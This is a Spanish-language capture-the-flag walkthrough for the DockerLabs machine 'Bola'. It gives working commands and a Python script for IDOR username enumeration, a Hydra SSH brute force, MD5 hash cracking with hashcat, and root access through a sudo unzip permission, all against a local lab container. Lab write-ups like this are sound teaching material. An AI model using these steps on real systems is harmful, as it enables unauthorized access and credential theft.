## Introducción

Este documento presenta la resolución completa de la máquina **Bola**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servicio HTTP en el puerto 12345 que aloja una API REST. Mediante enumeración, se identifica una vulnerabilidad **IDOR (Insecure Direct Object Reference)** en el endpoint `/user/{id}`, permitiendo extraer nombres de usuarios del sistema. Con esta lista, se realiza un ataque de fuerza bruta contra SSH utilizando Hydra, obteniendo acceso como el usuario `steven`.
Una vez dentro, se encuentran credenciales reutilizadas en MySQL y se extrae un hash MD5 del usuario `baluadmin`. Tras crackearlo con Hashcat, se accede a esta cuenta. Finalmente, se abusa del permiso sudo para ejecutar `unzip` como root, descomprimiendo un archivo que contiene la contraseña de `root`, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Bola.zip
sudo bash auto_deploy.sh Bola.tar
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **12345/tcp** — HTTP

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Enumeración de usuarios con IDOR

Se desarrolla un script en Python para enumerar usuarios del 1 al 20:

```python
import requests

with open('usernames.txt', 'w', encoding='utf-8') as file:
    for i in range(1, 21):
        try:
            url = f"http://172.17.0.2:12345/user/{i}"
            response = requests.get(url, timeout=3)

            if response.status_code == 200:
                data = response.json()
                username = data.get('username')
                if username:
                    file.write(f"{username}\n")
                else:
                    print(f"[-] Usuario {i}: Sin username")
            else:
                print(f"[!] Usuario {i}: Error {response.status_code}")

        except Exception:
            print(f"[!] Usuario {i}: Error de conexión")

print(f"\nUsernames guardados en 'usernames.txt'")
```

### 2.2 Fuerza bruta SSH

Se utiliza Hydra con la lista de usuarios obtenida:

```bash
hydra -L usernames.txt -P usernames.txt ssh://172.17.0.2 -t 64 -I
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1768540261/Hydra_blwpj3.png)

Se obtienen credenciales para el usuario `steven`:

```bash
ssh steven@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1768540265/SSH_ad9mfa.png)

## Paso 3 — Escalada de privilegios

### 3.1 De steven → baluadmin

En el `.bash_history` de `steven` se encuentran credenciales reutilizadas para MySQL:

```bash
mysql -u steven -p steven
```

En la base de datos `secretito`, tabla `usuarios`, se encuentra un hash MD5 del usuario `baluadmin`:

![Usuarios](https://res.cloudinary.com/dewqswzke/image/upload/v1768540267/Usuarios_oiihmn.png)

Se crackea el hash con Hashcat:

```bash
hashcat -m 0 -a 0 baluadmin.hash rockyou.txt
```

![Hashcat](https://res.cloudinary.com/dewqswzke/image/upload/v1768540261/Hashcat_wf9tfc.png)

Se cambia al usuario:

```bash
su baluadmin
```

![Baluadmin](https://res.cloudinary.com/dewqswzke/image/upload/v1768540259/Baluadmin_gpzafv.png)

### 3.2 De baluadmin → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1768540266/sudo-lBaluadmin_i0fdsv.png)

Se puede ejecutar `unzip` como root. Se descomprime `secretitosecretazo.zip`:

```bash
sudo unzip /home/steven/secretitosecretazo.zip -d /tmp
```

El archivo `sorpresitajiji.txt` contiene la contraseña de `root`:

![Sorpresitajiji](https://res.cloudinary.com/dewqswzke/image/upload/v1768540264/sorpresitajiji_hnyd7h.png)

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1768540264/Root_icqvur.png)
